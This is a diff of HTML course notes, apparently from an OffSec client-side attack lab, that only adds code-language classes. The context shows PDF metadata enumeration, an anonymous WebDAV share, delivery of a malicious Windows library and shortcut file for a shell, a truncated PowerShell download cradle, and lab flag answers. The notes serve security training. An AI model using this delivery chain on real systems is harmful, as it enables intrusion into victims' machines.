@@ -228,7 +228,7 @@ powershell.exe -Command &quot;$client = New-Object Net.WebClient; $client.Downlo
 </li>
 </ul>
 <p><strong>Example:</strong></p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/client-side]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/client-side]
 └─$ exiftool -a -u brochure.pdf 
 ExifTool Version Number         : 12.65
 File Name                       : brochure.pdf
@@ -297,7 +297,7 @@ Creator                         : Stanley Yelnats
 <pre><code>OS{f678c053253b0510a2c0b218bf47709c}
 </code></pre>
 <p>Start VM #2 and use gobuster to bruteforce the contents of the web server. Specify &quot;pdf&quot; as the filetype and find a document other than old.pdf and brochure.pdf. After you identify the file, download it and extract the flag in the metadata.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
 └─$ exiftool -a -u info.pdf             
 ExifTool Version Number         : 12.65
 File Name                       : info.pdf
@@ -666,7 +666,7 @@ End Sub
 </li>
 <li>Setup our WebDAV share.</li>
 </ul>
-<pre><code>kali@kali:~$ pip3 install wsgidav           
+<pre><code class="language-bash">kali@kali:~$ pip3 install wsgidav           
 Defaulting to user installation because normal site-packages is not writeable
 Collecting wsgidav
   Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
@@ -692,7 +692,7 @@ Successfully installed json5-0.9.6 wsgidav-4.0.1
 </ul>
 </li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/win-library-files]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/win-library-files]
 └─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/webdav
 Running without configuration file.
 12:54:48.073 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
@@ -894,7 +894,7 @@ know!
 <li>In this case we will use WebDAV to simulate the delivery method in our lab.</li>
 <li>Use <code>smbclient</code> with the <code>-c</code> param to specify <code>&#39;put config.Library-ms&#39;</code></li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/webdav]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/webdav]
 └─$ ls
 automatic_configuration.lnk  config.Library-ms
                                                                                          
@@ -905,7 +905,7 @@ putting file config.Library-ms as \config.Library-ms (2.8 kb/s) (average 2.8 kb/
 </code></pre>
 <p>A simulated user executes the file and we get a shell!</p>
 <p>Follow the steps in this section to get code execution on the HR137 (VM Group 1 - VM #2) system by using library and shortcut files. Be aware that after every execution of a .lnk file from the WebDAV share, the library file from the SMB share will be removed. You can find the flag on the desktop of the hsmith user. You can use VM #1 of VM Group 1 to build the library file and shortcut.</p>
-<pre><code>PS C:\Users\hsmith\Desktop&gt; cat flag.txt
+<pre><code class="language-powershell">PS C:\Users\hsmith\Desktop&gt; cat flag.txt
 cat flag.txt
 OS{e136120db43d939e68a8715d8c682b13}
 </code></pre>
@@ -913,7 +913,7 @@ OS{e136120db43d939e68a8715d8c682b13}
 <pre><code>true
 </code></pre>
 <p>Capstone Exercise: Enumerate the ADMIN (VM Group 2 - VM #4) machine and find a way to leverage Windows library and shortcut files to get code execution. Obtain a reverse shell and find the flag on the desktop for the Administrator user. You can use VM #3 of VM Group 2 to prepare your attack.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/win-library-files]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/win-library-files]
 └─$ nmap --script-help &quot;*&quot; | less
 
 
@@ -1026,7 +1026,7 @@ Finished
 <li>All accounts of IT staff created and usable.
  - CHECK THE METADATA!!!</li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/client-side]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/client-side]
 └─$ exiftool -a -u info.pdf 
 ExifTool Version Number         : 12.65
 File Name                       : info.pdf
